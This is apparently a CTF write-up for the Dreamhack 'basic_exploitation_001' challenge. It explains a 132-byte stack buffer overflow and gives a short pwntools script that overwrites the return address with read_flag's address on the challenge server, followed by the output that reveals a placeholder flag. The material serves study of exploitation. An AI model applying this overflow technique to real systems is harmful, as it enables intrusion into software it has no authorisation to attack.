# Dreamhack : basic_exploitation_001

[ Author : L1ya ]  

**1. Analysis**  

Because the buf size is 0x80(=128) and ebp size is 4, if we input 132 letters, we can get to return stack.  

We can find read_flag’s address in pwndbg.   

So, I input the address in retrun.  

**2. Vulnerabilities**  

Buf size is 0x80, but we can get over the 0x80 letters  

So, it maybe overflow the buffer.  

**3. Exploitation**  

```python  
from pwn import *  

p = remote("host8.dreamhack.games", 18025)  

payload = b"A" * 132  
payload += p32(0x80485b9) #read_flag 함수주소(pwndbg> p read_flag)  

p.send(payload)  
p.interactive()  
```

**4. Result**  

[▁] Opening connection to host8.dreamhack.games on port 18025: Try  
[+] Opening connection to host8.dreamhack.games on port 18025: Done  
[*] Switching to interactive mode  

$ cat flag  
DH{flag}  

[*] Got EOF while reading in interactive  

 [ NOTE ]  

I don’t know how to find read_flag function. I have to know more information about pwndbg.  
